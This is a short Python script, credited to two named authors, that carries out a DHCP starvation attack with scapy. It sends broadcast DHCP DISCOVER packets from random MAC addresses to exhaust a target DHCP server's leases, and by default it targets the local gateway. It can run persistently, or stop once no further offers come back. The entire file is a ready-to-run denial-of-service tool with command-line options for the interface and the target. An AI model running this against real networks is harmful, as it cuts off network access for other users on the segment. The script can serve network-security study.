# Maor Frost and Asaf Yahav
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

parser = argparse.ArgumentParser(description='DHCP Starvation')
# Do we want to keep attacking?
parser.add_argument('-p', '--persist', default=False, action='store_true', help='persistent?')
# Which interface do we want? default is the default interface
parser.add_argument('-i', '--iface', default=conf.iface, type=str, help='Interface you wish to use')
# Who do we want to attack? default is the gateway
parser.add_argument('-t', '--target', default=conf.route.route("0.0.0.0")[2], type=str, help='IP of target server')

args = parser.parse_args()

# Send a DHCP discover packet
def dhcp_discover(src_mac, target, iface):
    ip_dest = target
    mac_dest = "ff:ff:ff:ff:ff:ff" # Braodcast
    ether = Ether(src=src_mac, dst=mac_dest, type=0x0800) # Ethernet layer
    ip = IP(src='0.0.0.0', dst=ip_dest) # IP layer
    udp = UDP(sport=68, dport=67) # UDP layer
    bootp = BOOTP(chaddr=src_mac, # BOOTP layer
                  xid=random.randint(1, 1000000000),
                  flags=0xFFFFFF)
    dhcp = DHCP(options=[("message-type", "discover"), # DHCP layer
                         "end"])

    packet = ether / ip / udp / bootp / dhcp
    sendp(packet, iface=iface)
    print("discover sent")


def starve(target, iface, persistent):
    if persistent: # If we want the attack to be persistant we just keep sending DHCP discover packets from different MAC addresses
        while True:
            src_mac = RandMAC()
            dhcp_discover(src_mac = src_mac, target = target, iface = iface)
            time.sleep(1)

    else: # If we don't want the attack to be persistant we check if we get DHCP offers, if not we can stop the attack
        while True:
            counter = 0
            src_mac = RandMAC()
            while True:
                dhcp_discover(src_mac = src_mac, target = target ,iface = iface) # Send a DHCP discover
                dhcp_offer = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3) # Check for a DHCP offer
                if not len(dhcp_offer): # If we didn't get a DHCP offer, we try 3 more times
                    if counter >= 3: # If we still don't get a DHCP offer, we stop the attack
                        print("finishing attack")
                        return
                    counter += 1
                    print("retrying")
                    continue

# Calling the starve function
starve(target=args.target, iface=args.iface, persistent=args.persist)